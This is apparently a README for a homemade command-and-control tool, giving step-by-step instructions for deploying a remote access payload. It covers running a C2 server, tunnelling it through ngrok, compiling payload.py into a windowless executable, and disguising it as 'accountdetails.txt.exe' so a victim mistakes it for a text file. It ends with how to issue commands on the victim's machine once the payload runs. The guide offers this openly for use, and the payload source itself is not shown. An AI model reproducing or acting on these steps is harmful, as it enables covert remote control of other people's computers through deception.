# Run c2_server:
python c2_server.py

# In second terminal run ngrok:
ngrok http 4444

# Replace the ngrok url in payload.py and client.py

# Use auto-py-to-exe to convert .py to .exe 
(it will also change icon of .exe file)
pip install auto-py-to-exe                 #windows
run: auto-py-to-exe                        
# or
compile the payload.py into payload.exe
pip install pyinstaller                    #windows
pyinstaller --OneFile --noconsole payload.py

# Rename payload.exe to something important like accountdetails.txt.exe
# Turn off "show file name extensions" > accountdetails.txt (looks like a text file)

# Create virtual environment
python3 -m venv c2_env

# Activate it
source c2_env/bin/activate  # Linux/macOS
or
c2_env\Scripts\activate     # Windows

# Now install packages normally
pip install requests prompt_toolkit

# In third terminal run client:
python client.py

Once the payload runs in remote machine.
you will receive connection requests in c2_server terminal. 
You can execute commands in client terminal.
